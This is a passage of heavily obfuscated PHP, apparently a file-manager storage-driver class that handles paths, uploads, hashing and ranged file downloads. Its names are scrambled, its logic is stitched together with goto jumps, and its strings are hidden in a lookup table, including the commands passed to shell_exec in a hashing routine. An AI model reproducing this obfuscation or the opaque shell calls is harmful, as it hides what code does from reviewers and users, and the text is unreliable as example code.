$BßïÎ²†Š->path; } public function getPathOuter($cùÕÚÃñˆ×) { $Bßæ‘§ĞŒ¥ =& $_SERVER[ì‹É]; $FìÕãÉ•ñ = strlen(trim($this->pathBase, $Bßæ‘§ĞŒ¥[8])); $cùÕÚÃñˆ× = substr(trim($cùÕÚÃñˆ×, $Bßæ‘§ĞŒ¥[8]), $FìÕãÉ•ñ); return $this->pathDriver . $Bßæ‘§ĞŒ¥[8] . ltrim($cùÕÚÃñˆ×, $Bßæ‘§ĞŒ¥[8]); } public function isParentOf($EïñæŸù‚Í, $f·®Úì°‰) { $b í–±»Ÿ¦ =& $_SERVER[ì‹É]; $EïñæŸù‚Í = rtrim(strtolower($EïñæŸù‚Í), $b í–±»Ÿ¦[8]) . $b í–±»Ÿ¦[8]; $f·®Úì°‰ = rtrim(strtolower($f·®Úì°‰), $b í–±»Ÿ¦[8]) . $b í–±»Ÿ¦[8]; $B¾óª‹æİ‚ = strpos($f·®Úì°‰, $EïñæŸù‚Í) === 0; return $B¾óª‹æİ‚; } public function getType() { $dšòßŸ¶²‰ =& $_SERVER[ì‹É]; $AŸÛéÔõ¥ = str_replace($dšòßŸ¶²‰[72], $dšòßŸ¶²‰[33], get_class($this)); return strtolower($AŸÛéÔõ¥); } public function isTypeObject() { return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($fİï¼ˆœø©, $DÃâÆ—ïç™) { $C»³‘ÎÙ =& $_SERVER[ì‹É]; $BÅ˜±©¢¶¨ = rtrim($fİï¼ˆœø©, $C»³‘ÎÙ[8]) . $C»³‘ÎÙ[8] . $DÃâÆ—ïç™; $c„¬ƒó²ˆÉ = $this->exist($BÅ˜±©¢¶¨); return $c„¬ƒó²ˆÉ ? $BÅ˜±©¢¶¨ : !1; } public function renameObject($E‹„­‘Ø, $aíË¥óàÏ„) { $aëˆî­®å =& $_SERVER[ì‹É]; Hook::trigger($aëˆî­®å[73], $this, $E‹„­‘Ø, $this, $this->pathFather($E‹„­‘Ø) . $aíË¥óàÏ„); $E‹„­‘Ø = $this->getPathOuter($E‹„­‘Ø); $aíË¥óàÏ„ = $this->pathFather($E‹„­‘Ø) . $aíË¥óàÏ„; if (IO::isFile($E‹„­‘Ø)) { $Aë…¢ÕØø× = IO::move($E‹„­‘Ø, $aíË¥óàÏ„, REPEAT_RENAME_FOLDER); } else { $Aë…¢ÕØø× = IO::mkdir($aíË¥óàÏ„); if (!$Aë…¢ÕØø×) { return !1; } $CÄß­›¯¬ = IO::listPath($E‹„­‘Ø, !0); $AŞÈê¾Ç› = array_merge($CÄß­›¯¬[$aëˆî­®å[74]], $CÄß­›¯¬[$aëˆî­®å[75]]); foreach ($AŞÈê¾Ç› as $EöÜîä‹äÂ) { IO::move($EöÜîä‹äÂ[$aëˆî­®å[76]], $aíË¥óàÏ„, REPEAT_RENAME_FOLDER); } IO::remove($E‹„­‘Ø); } return $Aë…¢ÕØø× ? $aíË¥óàÏ„ : !1; } public function tempFile($Aùğä‚‰öá = '', $E”£‘´²£Û = '') { goto cÄàËáäº; cÄàËáäº: if (!$Aùğä‚‰öá) { $Aùğä‚‰öá = rand_string(15); } $C¡‘ø¡³´ = TEMP_FILES . rand_string(15) . $_SERVER[ì‹É][8]; @mkdir($C¡‘ø¡³´, 511, !0); goto Cß‘ÈŸ†ğ›; FÊ¼äØàØØ: return $a¦Õˆ…ï¿¾; goto Dªˆá„ó‚”; Cß‘ÈŸ†ğ›: $a¦Õˆ…ï¿¾ = $C¡‘ø¡³´ . $Aùğä‚‰öá; @touch($a¦Õˆ…ï¿¾); if ($E”£‘´²£Û) { file_put_contents($a¦Õˆ…ï¿¾, $E”£‘´²£Û); } goto FÊ¼äØàØØ; Dªˆá„ó‚”: } public function tempFileRemve($a½„”Ò‡¶·) { @unlink($a½„”Ò‡¶·); @rmdir($this->pathFather($a½„”Ò‡¶·)); } public function mkfile($Fô í”“ø , $CòÔ¯Øí— = '', $DÈ‡ƒì‚ = REPEAT_RENAME) { } public function mkdir($fìâö˜˜Í¢, $f„½¸ˆ‹Áé = REPEAT_SKIP) { } public function copyFile($aÅÚº“Œƒ, $AŠ”Ÿ½à¬ø) { } public function moveFile($bÙÏ×´öÒŠ, $FŞ®İôî) { } public function remove($c­øÁèæù¤) { if ($this->isFile($c­øÁèæù¤)) { return $this->delFile($c­øÁèæù¤); } return $this->delFolder($c­øÁèæù¤); } public function rename($f¶ãìñÍ«õ, $eŒĞ¹¨¶Ä£) { } public function exist($añšË£“ã™) { } public function findByHash($D“î¯ÑĞ¸ = '', $DğŠ‘²ÊÖˆ = '') { return !1; } public function isFile($AáÎæÛ¸—Á) { } public function isFolder($F¸—£Á˜ª) { } public function size($DãœŸÓàÛ») { } public function info($f®ÎëŠÛ–) { } public function infoSimple($EÙªÊÂñ‰†) { return $this->info($EÙªÊÂñ‰†); } public function infoAuth($a‰íÕÊ¤Ç) { return $this->info($a‰íÕÊ¤Ç); } public function infoFull($eáİ©‚¦õ) { return $this->info($eáİ©‚¦õ); } public function infoWithChildren($Dà’¡á×ÀÁ) { $d‘¿Èù‰Ÿ– =& $_SERVER[ì‹É]; $D·š–Íö´ğ = $this->info($Dà’¡á×ÀÁ); if ($D·š–Íö´ğ && $D·š–Íö´ğ[$d‘¿Èù‰Ÿ–[29]] == $d‘¿Èù‰Ÿ–[77]) { $eµµ¡µ¯¼ƒ = array($d‘¿Èù‰Ÿ–[78] => 0, $d‘¿Èù‰Ÿ–[79] => 0, $d‘¿Èù‰Ÿ–[80] => 0); $this->infoChildren($Dà’¡á×ÀÁ, $eµµ¡µ¯¼ƒ); $D·š–Íö´ğ[$d‘¿Èù‰Ÿ–[78]] = $eµµ¡µ¯¼ƒ[$d‘¿Èù‰Ÿ–[78]]; $D·š–Íö´ğ[$d‘¿Èù‰Ÿ–[81]] = array($d‘¿Èù‰Ÿ–[82] => $eµµ¡µ¯¼ƒ[$d‘¿Èù‰Ÿ–[79]], $d‘¿Èù‰Ÿ–[83] => $eµµ¡µ¯¼ƒ[$d‘¿Èù‰Ÿ–[80]]); } return $D·š–Íö´ğ; } public function listPath($A–³³ÁÅº, $aœ„¾ó½¼¾ = false) { } public function has($AÀ‰‘§“±­, $fõÑğÎÉÈ¹ = false, $Cƒ‰Ï›öÙê = false) { } public function canRead($eÕÌ§¥À½ ) { } public function canWrite($e’Ÿ·˜…¡) { } public function getContent($c‡š¾ŞÒ) { } public function setContent($c¼Î¹‡†§, $Cœ‰ÈÛ¹È = '') { } protected function infoChildren($e»òŠƒã¯, &$eµÖÚ¥Ãá) { $aš…ÁÒÔá =& $_SERVER[ì‹É]; check_abort(); $däğ˜Ë‡”º = $this->listPath($e»òŠƒã¯, !0); $däğ˜Ë‡”º = array_merge($däğ˜Ë‡”º[$aš…ÁÒÔá[75]], $däğ˜Ë‡”º[$aš…ÁÒÔá[74]]); foreach ($däğ˜Ë‡”º as $D¹°øàóäÛ) { if ($D¹°øàóäÛ[$aš…ÁÒÔá[29]] == $aš…ÁÒÔá[77]) { $eµÖÚ¥Ãá[$aš…ÁÒÔá[80]]++; $A ã½ô„±² = $this->getPathInner($D¹°øàóäÛ[$aš…ÁÒÔá[76]]); $this->infoChildren($A ã½ô„±², $eµÖÚ¥Ãá); } else { $eµÖÚ¥Ãá[$aš…ÁÒÔá[79]]++; $eµÖÚ¥Ãá[$aš…ÁÒÔá[78]] += $D¹°øàóäÛ[$aš…ÁÒÔá[78]]; } } } public function fileSubstr($A¬Ç†¥è±Å, $aºî™Áóá, $C‹¥¨÷í‚) { } public function listAll($b˜òÍæ«š) { } public function upload($bÇ¾åö½÷¼, $a¬õ“İã½¥, $FŠ¨÷ñêÔ¹ = false, $Eô§§å£¬Ğ = REPEAT_REPLACE) { } public function uploadFileByID($bš•à°¾É, $CÅ‰ÛœŞÂÙ, $dÎã‹ ‹Ê) { } public function uploadFileByPath($eÀ¢Œ•¹Şñ, $BŸèˆ–ğ°Ú, $AâÈª«ñåÆ = array()) { } public function isUploadServer() { $EÀ¦‡¡ŒÁÊ =& $_SERVER[ì‹É]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $EÀ¦‡¡ŒÁÊ[84]) { return !0; } return $GLOBALS[$EÀ¦‡¡ŒÁÊ[6]][$EÀ¦‡¡ŒÁÊ[85]][$EÀ¦‡¡ŒÁÊ[86]]; } public function isFileOutServer() { $fÉô«†çĞ =& $_SERVER[ì‹É]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $fÉô«†çĞ[84]) { return !0; } return $GLOBALS[$fÉô«†çĞ[6]][$fÉô«†çĞ[85]][$fÉô«†çĞ[87]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($eäñœ¦¶¢) { $bÔ¿´ÙË¦ =& $_SERVER[ì‹É]; if (!$this->isCdnHost()) { return $eäñœ¦¶¢; } return str_replace(trim(get_url_root($eäñœ¦¶¢), $bÔ¿´ÙË¦[8]), trim($this->cdnHost, $bÔ¿´ÙË¦[8]), $eäñœ¦¶¢); } public function uploadLink($FĞõ³—“Â…, $f¦±—ë”Ë´ = 0) { goto eİ™Ô¾âÒ; AµœŒ—ªåì: $bƒäˆè º = $this->{$aÈâÓŠçõ‘}($FĞõ³—“Â…, $d‚ã”ƒºí‹); if ($bƒäˆè º) { $bƒäˆè º[$a¹ãî°•ƒ“[90]] = $FĞõ³—“Â…; $bƒäˆè º[$a¹ãî°•ƒ“[91]] = $FíÕ¼¹Ÿ; } return $bƒäˆè º; goto F¯Ú¥ëªäß; eİ™Ô¾âÒ: $a¹ãî°•ƒ“ =& $_SERVER[ì‹É]; if ($this->isUploadServer()) { return; } $FíÕ¼¹Ÿ = $this->getType(); goto aŸƒ£Ÿ¦æ‹; cíàƒ­ğ‰Ó: $aÈâÓŠçõ‘ = $f¦±—ë”Ë´ <= $E‚âÚ£Âê¬ ? $a¹ãî°•ƒ“[88] : $a¹ãî°•ƒ“[89]; if ($FíÕ¼¹Ÿ == $a¹ãî°•ƒ“[61]) { $aÈâÓŠçõ‘ = $a¹ãî°•ƒ“[89]; } $d‚ã”ƒºí‹ = (!$f¦±—ë”Ë´ ? 1 : ceil($f¦±—ë”Ë´ / pow(1024, 3))) * 3600 * 4; goto AµœŒ—ªåì; aŸƒ£Ÿ¦æ‹: if (!in_array($FíÕ¼¹Ÿ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $E‚âÚ£Âê¬ = 1024 * 1024 * 10; goto cíàƒ­ğ‰Ó; F¯Ú¥ëªäß: } public function uploadFormData($BÜ±Êâ¿°, $E«×À¡µÛ = 3600) { } public function multiUploadFormData($bèÄÇöÙá«, $c±äŸå³™² = 3600) { } public function osChunkSize() { $F¦Š—„¼¾ =& $_SERVER[ì‹É]; $A ¦É¥Ç†Ï = (double) $GLOBALS[$F¦Š—„¼¾[6]][$F¦Š—„¼¾[85]][$F¦Š—„¼¾[92]][$F¦Š—„¼¾[93]]; if (!$A ¦É¥Ç†Ï) { $A ¦É¥Ç†Ï = 1024 * 84 * 10; } return $A ¦É¥Ç†Ï; } public function download($eó×´Å”ÑŞ, $fÕ¹Æ¹Ì¾) { } public function ext($F§îËèÚÓĞ) { $b•¹ŠÕí½ö =& $_SERVER[ì‹É]; if (strpos($F§îËèÚÓĞ, $b•¹ŠÕí½ö[8]) === -1) { $eˆÖöí…Ã® = $F§îËèÚÓĞ; } else { $eˆÖöí…Ã® = $this->pathThis($F§îËèÚÓĞ); } $F¾Û–Ñœ– = $b•¹ŠÕí½ö[33]; if (strstr($eˆÖöí…Ã®, $b•¹ŠÕí½ö[94])) { $F¾Û–Ñœ– = substr($eˆÖöí…Ã®, strrpos($eˆÖöí…Ã®, $b•¹ŠÕí½ö[94]) + 1); $F¾Û–Ñœ– = strtolower($F¾Û–Ñœ–); } if (strlen($F¾Û–Ñœ–) > 3 && preg_match($b•¹ŠÕí½ö[95], $F¾Û–Ñœ–, $bĞ›ì§Û¤¾)) { $F¾Û–Ñœ– = $b•¹ŠÕí½ö[33]; } return $F¾Û–Ñœ–; } public function pathThis($bÏÌğ¥£Ÿô) { $BÊª£ó®• =& $_SERVER[ì‹É]; $bÏÌğ¥£Ÿô = str_replace($BÊª£ó®•[96], $BÊª£ó®•[8], rtrim($bÏÌğ¥£Ÿô, $BÊª£ó®•[8])); $Eß‰‹³êù÷ = strrpos($bÏÌğ¥£Ÿô, $BÊª£ó®•[8]); if ($Eß‰‹³êù÷ === !1) { return $bÏÌğ¥£Ÿô; } return substr($bÏÌğ¥£Ÿô, $Eß‰‹³êù÷ + 1); } public function pathFather($Cœƒê¯’È) { $d›İÀàÒ· =& $_SERVER[ì‹É]; $Cœƒê¯’È = str_replace($d›İÀàÒ·[96], $d›İÀàÒ·[8], rtrim($Cœƒê¯’È, $d›İÀàÒ·[8])); $DÍ‚É‡ ¹ = strrpos($Cœƒê¯’È, $d›İÀàÒ·[8]); if ($DÍ‚É‡ ¹ === !1) { return $d›İÀàÒ·[33]; } return substr($Cœƒê¯’È, 0, $DÍ‚É‡ ¹ + 1); } public function hashSimple($fóåµ«“¤) { goto A“Ì¶ã„À±; Cî‘çÂÒ…: $D—Œ¹ÒÒ¶ = intval($bèƒ‡ÚáÅÌ / $fêĞ¬¯ó·ö); $a‰Çğïöˆ = $A÷Ô¯æ¾…Ë[33]; for ($dÒèß³³Ä = 0; $dÒèß³³Ä < $fêĞ¬¯ó·ö; $dÒèß³³Ä++) { $a‰Çğïöˆ .= $this->fileSubstr($fóåµ«“¤, $D—Œ¹ÒÒ¶ * $dÒèß³³Ä, $cÛàÂàíå³); } goto a¦ƒ„Å »õ; Dá§Ÿµ‘·²: $cÛàÂàíå³ = 200; $fêĞ¬¯ó·ö = 50; if ($bèƒ‡ÚáÅÌ <= $cÛàÂàíå³ * $fêĞ¬¯ó·ö) { return $this->hashMd5($fóåµ«“¤) . $bèƒ‡ÚáÅÌ; } goto Cî‘çÂÒ…; A“Ì¶ã„À±: $A÷Ô¯æ¾…Ë =& $_SERVER[ì‹É]; if (!$fóåµ«“¤) { return md5($A÷Ô¯æ¾…Ë[33]); } $bèƒ‡ÚáÅÌ = $this->size($fóåµ«“¤); goto Dá§Ÿµ‘·²; a¦ƒ„Å »õ: $a‰Çğïöˆ .= $this->fileSubstr($fóåµ«“¤, $bèƒ‡ÚáÅÌ - $cÛàÂàíå³, $cÛàÂàíå³); return md5($a‰Çğïöˆ) . $bèƒ‡ÚáÅÌ; goto fš‡¢ÜØ…; fš‡¢ÜØ…: } public static $md5Cache = array(); public function hashMd5($cïîğ±ÁÆ) { $cïîğ±ÁÆ = $this->iconvSystem($cïîğ±ÁÆ); if (isset(self::$md5Cache[$cïîğ±ÁÆ])) { return self::$md5Cache[$cïîğ±ÁÆ]; } self::$md5Cache[$cïîğ±ÁÆ] = $this->hashMd5Shell($cïîğ±ÁÆ); if (!self::$md5Cache[$cïîğ±ÁÆ]) { self::$md5Cache[$cïîğ±ÁÆ] = @md5_file($cïîğ±ÁÆ); } return self::$md5Cache[$cïîğ±ÁÆ]; } private function hashMd5Shell($a®§Š“×«´) { goto c‹èİ™‚ƒŸ; dÙİÏ„Î’˜: $aˆ¶àÉ‘Ùš = Cache::get($FîœŒ¡‚ñ[100]); if (!$aˆ¶àÉ‘Ùš) { $a½ĞÆ Æ‘‰ = BASIC_PATH . $FîœŒ¡‚ñ[101]; $bòÊ¢ÄÎÍ„ = md5_file($a½ĞÆ Æ‘‰); $aˆ¶àÉ‘Ùš = $FîœŒ¡‚ñ[102]; foreach ($fê®à›ìÏí as $a—–…‡¨Ï¾) { $BøêÄ¼›¨” = shell_exec($a—–…‡¨Ï¾ . "\x20\x22{$a½ĞÆ Æ‘‰}\42"); if ($BøêÄ¼›¨” && substr(trim($BøêÄ¼›¨”), 0, 32) == $bòÊ¢ÄÎÍ„) { $aˆ¶àÉ‘Ùš = $a—–…‡¨Ï¾; break; } } Cache::set($FîœŒ¡‚ñ[100], $aˆ¶àÉ‘Ùš, 3600); } if ($aˆ¶àÉ‘Ùš == $FîœŒ¡‚ñ[102]) { return !1; } goto bºÆÕî¢³—; c‹èİ™‚ƒŸ: $FîœŒ¡‚ñ =& $_SERVER[ì‹É]; if (!function_exists($FîœŒ¡‚ñ[97])) { return !1; } $fê®à›ìÏí = array($FîœŒ¡‚ñ[98], $FîœŒ¡‚ñ[99]); goto dÙİÏ„Î’˜; bºÆÕî¢³—: $BøêÄ¼›¨” = shell_exec($aˆ¶àÉ‘Ùš . "\x20\x22{$a®§Š“×«´}\42"); return substr($BøêÄ¼›¨”, 0, 32); goto Cß¥Êƒ™ä; Cß¥Êƒ™ä: } public function link($C·¦’Åõ²ò) { return $C·¦’Åõ²ò; } public function fileOut($e‘ Ì›ÙË—, $d”•‚¶÷™ = false, $BÇÈ’ÓŸ¡ = false, $AèßÓÌÛìØ = '') { goto B¾‹÷¼…„Ö; a¶‡‹ğƒ»î: if (isset($_SERVER[$DƒÂ¯È‹òî[129]]) && strtotime($_SERVER[$DƒÂ¯È‹òî[129]]) == $b‹äÛÃÖÆè[$DƒÂ¯È‹òî[108]]) { header($DƒÂ¯È‹òî[130], !0, 304); die; } if (isset($_SERVER[$DƒÂ¯È‹òî[131]]) && $_SERVER[$DƒÂ¯È‹òî[131]] == $AèßÓÌÛìØ) { header($DƒÂ¯È‹òî[132] . $AèßÓÌÛìØ, !0, 304); die; } header($DƒÂ¯È‹òî[132] . $AèßÓÌÛìØ); goto B å×§ùÓÆ; Få‚ï½ù²Ş: header($DƒÂ¯È‹òî[122]); header($DƒÂ¯È‹òî[123] . $dö‰ŠÆ²ÃÈ); header($DƒÂ¯È‹òî[124] . gmdate($DƒÂ¯È‹òî[107], time() + 3600 * 24 * 30) . $DƒÂ¯È‹òî[125]); goto eÓİ‡ÁÂŠ¸; fçºßãºŸ: if (in_array($a™ÔˆŒŒ×, array($DƒÂ¯È‹òî[109], $DƒÂ¯È‹òî[110], $DƒÂ¯È‹òî[111], $DƒÂ¯È‹òî[112]))) { $a™ÔˆŒŒ× = $DƒÂ¯È‹òî[113]; } if (!$AèßÓÌÛìØ) { $AèßÓÌÛìØ = md5($cÕÇ©•¨öÍ . $this->hashSimple($e‘ Ì›ÙË—)); } $AèßÓÌÛìØ = $DƒÂ¯È‹òî[114] . $AèßÓÌÛìØ . $DƒÂ¯È‹òî[114]; goto CÕÄÅğËïö; Få‹¡ÒœäÒ: $Dæº‡µê¥¥ = $b‹äÛÃÖÆè[$DƒÂ¯È‹òî[78]]; $cÕÇ©•¨öÍ = gmdate($DƒÂ¯È‹òî[107], $b‹äÛÃÖÆè[$DƒÂ¯È‹òî[108]]); $A—ñõ¤‘Ğ¾ = $BÇÈ’ÓŸ¡ ? $BÇÈ’ÓŸ¡ : $this->iconvApp($b‹äÛÃÖÆè[$DƒÂ¯È‹òî[28]]); goto DÍ°¼ê˜¾Ã; a‹ËÊê±Ğ: if ($F–Ô…³Ù² && $A®ƒ¥Ç»ôí && $B¬µ åİÖ) { if (strstr($A®ƒ¥Ç»ôí, $DƒÂ¯È‹òî[139])) { header($DƒÂ¯È‹òî[140] . $e‘ Ì›ÙË—); } else { if (strstr($A®ƒ¥Ç»ôí, $DƒÂ¯È‹òî[141])) { header($DƒÂ¯È‹òî[142] . $e‘ Ì›ÙË—); } else { if (strstr($A®ƒ¥Ç»ôí, $DƒÂ¯È‹òî[143])) { header($DƒÂ¯È‹òî[144] . $e‘ Ì›ÙË—); } } } if ($Fë¥¶öŒì¼) { header($DƒÂ¯È‹òî[145] . $Fë¥¶öŒì¼); } return; } if (isset($_SERVER[$DƒÂ¯È‹òî[146]])) { if (preg_match($DƒÂ¯È‹òî[147], $_SERVER[$DƒÂ¯È‹òî[146]], $aÚÒÑ¹í«Ò)) { $aëä…¢ = intval($aÚÒÑ¹í«Ò[1]); if (!empty($aÚÒÑ¹í«Ò[2])) { $e£©à´‹² = intval($aÚÒÑ¹í«Ò[2]); } } header($DƒÂ¯È‹òî[148]); header("\103\157\x6e\x74\x65\156\164\x2d\x52\x61\x6e\x67\145\72\x20\142\x79\x74\145\x73\x20{$aëä…¢}\55{$e£©à´‹²}\57" . $Dæº‡µê¥¥); } else { header($DƒÂ¯È‹òî[149]); } header($DƒÂ¯È‹òî[150] . ($e£©à´‹² - $aëä…¢ + 1)); goto E¶Àç§„ºí; B å×§ùÓÆ: header($DƒÂ¯È‹òî[133] . $cÕÇ©•¨öÍ . $DƒÂ¯È‹òî[125]); header($DƒÂ¯È‹òî[134] . $A—ñõ¤‘Ğ¾); header($DƒÂ¯È‹òî[135]); goto BçÈœÓĞêå; CÕÄÅğËïö: $dö‰ŠÆ²ÃÈ = get_file_mime($a™ÔˆŒŒ×); if (strstr($dö‰ŠÆ²ÃÈ, $DƒÂ¯È‹òî[115])) { $dö‰ŠÆ²ÃÈ = $dö‰ŠÆ²ÃÈ . $DƒÂ¯È‹òî[116]; } if ($d”•‚¶÷™ === !1 && !mime_support($dö‰ŠÆ²ÃÈ)) { $d”•‚¶÷™ = !0; $dö‰ŠÆ²ÃÈ = $DƒÂ¯È‹òî[117]; } goto c™‹íàÅÇ; E¶Àç§„ºí: if ($_SERVER[$DƒÂ¯È‹òî[151]] == $DƒÂ¯È‹òî[152]) { return; } $E–Õ‰ï“¶É = 1024 * 100; $b¼á„†ªÀ¹ = 0; goto b¬ãÚ˜¹ï¶; c™‹íàÅÇ: $f³óÕ”¦« = rawurlencode($A—ñõ¤‘Ğ¾); $f³óÕ”¦« = $DƒÂ¯È‹òî[114] . $f³óÕ”¦« . $DƒÂ¯È‹òî[118] . $f³óÕ”¦«; if ($d”•‚¶÷™) { header($DƒÂ¯È‹òî[119]); header($DƒÂ¯È‹òî[120] . $f³óÕ”¦«); } else { header($DƒÂ¯È‹òî[121] . $f³óÕ”¦«); } goto Få‚ï½ù²Ş; DŠ•’©‚Æê: @ob_end_clean(); set_timeout(); $b‹äÛÃÖÆè = $this->infoFull($e‘ Ì›ÙË—); goto Få‹¡ÒœäÒ; CìÜŸˆºÓ: $F–Ô…³Ù² = $this->getType() == $DƒÂ¯È‹òî[104]; $B¬µ åİÖ = $GLOBALS[$DƒÂ¯È‹òî[6]][$DƒÂ¯È‹òî[85]][$DƒÂ¯È‹òî[92]][$DƒÂ¯È‹òî[105]]; $Fë¥¶öŒì¼ = (double) $GLOBALS[$DƒÂ¯È‹òî[6]][$DƒÂ¯È‹òî[85]][$DƒÂ¯È‹òî[92]][$DƒÂ¯È‹òî[106]] * 1024 * 1024; goto DŠ•’©‚Æê; b¬ãÚ˜¹ï¶: if ($Fë¥¶öŒì¼) { $b¼á„†ªÀ¹ = intval(1000 * 1000 * ($E–Õ‰ï“¶É / $Fë¥¶öŒì¼)); } while ($aëä…¢ <= $e£©à´‹²) { $BàÖÛÜ»¨ = timeFloat(); check_abort(); $c‡Îº•ì˜Æ = $e£©à´‹² - $aëä…¢ + 1; if ($c‡Îº•ì˜Æ <= $E–Õ‰ï“¶É) { $E–Õ‰ï“¶É = $c‡Îº•ì˜Æ; } echo $this->fileSubstr($e‘ Ì›ÙË—, $aëä…¢, $E–Õ‰ï“¶É); $aëä…¢ += $E–Õ‰ï“¶É; if ($E–Õ‰ï“¶É == $c‡Îº•ì˜Æ) { $aëä…¢ = $e£©à´‹² + 1; } if ($b¼á„†ªÀ¹) { $E£ÑÃÊÍí¦ = intval(1000 * 1000 * (timeFloat() - $BàÖÛÜ»¨)); $a¸Æ‘ÑÉ®È = $b¼á„†ªÀ¹ - $E£ÑÃÊÍí¦; if ($a¸Æ‘ÑÉ®È > 5) { usleep($a¸Æ‘ÑÉ®È); } } } goto cù–‰’ÒÆ¯; eÓİ‡ÁÂŠ¸: header($DƒÂ¯È‹òî[126]); header($DƒÂ¯È‹òî[127]); header($DƒÂ¯È‹òî[128]); goto a¶‡‹ğƒ»î; B¾‹÷¼…„Ö: $DƒÂ¯È‹òî =& $_SERVER[ì‹É]; $this->cacheMethod(null, null); if (!$e‘ Ì›ÙË— || !$this->exist($e‘ Ì›ÙË—)) { show_json(LNG($DƒÂ¯È‹òî[103]), !1, $BÇÈ’ÓŸ¡); } goto CìÜŸˆºÓ; BçÈœÓĞêå: header($DƒÂ¯È‹òî[136] . $Dæº‡µê¥¥); header($DƒÂ¯È‹òî[137]); $A®ƒ¥Ç»ôí = strtolower($_SERVER[$DƒÂ¯È‹òî[138]]); goto a‹ËÊê±Ğ; DÍ°¼ê˜¾Ã: $aëä…¢ = 0; $e£©à´‹² = $Dæº‡µê¥¥ - 1; $a™ÔˆŒŒ× = $this->ext($A—ñõ¤‘Ğ¾); goto fçºßãºŸ; cù–‰’ÒÆ¯: } public function fileOutServer($Eƒé†¬ç , $eÄÃß—ëØŠ = false, $f‡â…Èˆ = false, $cÒÎĞÜ‚‚ = '') { $this->fileOut($Eƒé†¬ç , $eÄÃß—ëØŠ, $f‡â…Èˆ, $cÒÎĞÜ‚‚); } public function fileOutLink($cõÔÓÔ¼ö) { header($_SERVER[ì‹É][153] . $cõÔÓÔ¼ö); die; } public function cacheMethod($b«·˜¦À·£, $dã°³»«”Ç) { goto FË›ÙƒØÖ; EÕŒÃ‘ğ’±: if (!is_null($bñ²‘®í»Ë)) { return $bñ²‘®í»Ë; } $bñ²‘®í»Ë = $this->{$b«·˜¦À·£}($dã°³»«”Ç); $e‰½ùÉƒñì[$f‰³¸©Éº¹] = $bñ²‘®í»Ë; goto AÛù÷»–¶â; AÛù÷»–¶â: return $bñ²‘®í»Ë; goto e£„™ëÚÛ; E¥™ˆ«Ò¹‘: if (is_null($b«·˜¦À·£)) { $e‰½ùÉƒñì = array(); return; } if (is_null($dã°³»«”Ç)) { unset($e‰½ùÉƒñì[$f‰³¸©Éº¹]); return; } $bñ²‘®í»Ë = isset($e‰½ùÉƒñì[$f‰³¸©Éº¹]) ? $e‰½ùÉƒñì[$f‰³¸©Éº¹] : null; goto EÕŒÃ‘ğ’±; FË›ÙƒØÖ: $dô…®¼öÔ„ =& $_SERVER[ì‹É]; static $e‰½ùÉƒñì = array(); $f‰³¸©Éº¹ = $dô…®¼öÔ„[154] . $b«·˜¦À·£ . $dô…®¼öÔ„[155] . rtrim($dã°³»«”Ç, $dô…®¼öÔ„[8]); goto E¥™ˆ«Ò¹‘; e£„™ëÚÛ: } public function fileOutImage($EÛÀÈÉ±¬£, $b©ƒ¥ˆ“¦¶ = 250) { goto EŠÚ¾Šœ©é; dœ£¿Àì¡ä: if (!($bßŞìÚåå’ = IO::move($Bä¤¦öåˆ”, $FÎ¡ÕêÖ”))) { return IO::fileOut($Bä¤¦öåˆ”); } del_file($Bä¤¦öåˆ”); IO::fileOut($bßŞìÚåå’); goto DÙÈ©›Õ¯; EŠÚ¾Šœ©é: $DÉˆÁ í£ó =& $_SERVER[ì‹É]; if (substr($EÛÀÈÉ±¬£, 0, 4) == $DÉˆÁ í£ó[143]) { $this->fileOutLink($EÛÀÈÉ±¬£); } $FÅ„‰µÚ†Õ = $this->info($EÛÀÈÉ±¬£); goto D¸ëß”¢; BßßØ‹†—: $Bä¤¦öåˆ” = DATA_THUMB . $C‚˜§Š›; if (!@file_exists($Bä¤¦öåˆ”)) { $e‚¦ªŠé = TEMP_FILES; if (!is_dir($e‚¦ªŠé)) { mk_dir($e‚¦ªŠé); } $A¬Åòî‘šØ = $e‚¦ªŠé . $Fİƒ¦Ä . $DÉˆÁ í£ó[94] . $FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[157]]; if (!@file_exists($A¬Åòî‘šØ)) { $A¬Åòî‘šØ = $this->download($EÛÀÈÉ±¬£, $A¬Åòî‘šØ); } $d²–¢õÇ¾æ = new ImageThumb($A¬Åòî‘šØ, $DÉˆÁ í£ó[164]); $d²–¢õÇ¾æ->prorate($Bä¤¦öåˆ”, $b©ƒ¥ˆ“¦¶, $b©ƒ¥ˆ“¦¶); } if (!file_exists($Bä¤¦öåˆ”) || filesize($Bä¤¦öåˆ”) < 100) { return @file_exists($A¬Åòî‘šØ) ? IO::fileOut($A¬Åòî‘šØ) : $this->fileOut($EÛÀÈÉ±¬£); } goto dœ£¿Àì¡ä; c×ŒªŒ¡õ: if (!($CƒÒÍë¹ÜÈ = IO::fileNameExist(IO_PATH_SYSTEM_TEMP, $DÉˆÁ í£ó[162]))) { $FÎ¡ÕêÖ” = IO::mkdir(IO_PATH_SYSTEM_TEMP . $DÉˆÁ í£ó[163]); } else { $FÎ¡ÕêÖ” = KodIO::make($CƒÒÍë¹ÜÈ); } if ($CƒÒÍë¹ÜÈ = IO::fileNameExist($FÎ¡ÕêÖ”, $C‚˜§Š›)) { $Bä¤¦öåˆ” = KodIO::make($CƒÒÍë¹ÜÈ); return IO::fileOut($Bä¤¦öåˆ”); } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } goto BßßØ‹†—; D¸ëß”¢: if ($FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[78]] <= 1024 * 50 || !function_exists($DÉˆÁ í£ó[156]) || $FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[157]] == $DÉˆÁ í£ó[158]) { return $this->fileOut($EÛÀÈÉ±¬£); } if (isset($FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[159]][$DÉˆÁ í£ó[160]])) { $Fİƒ¦Ä = $FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[159]][$DÉˆÁ í£ó[160]]; } else { if (isset($FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[159]][$DÉˆÁ í£ó[161]])) { $Fİƒ¦Ä = $FÅ„‰µÚ†Õ[$DÉˆÁ í£ó[159]][$DÉˆÁ í£ó[161]]; } else { $Fİƒ¦Ä = 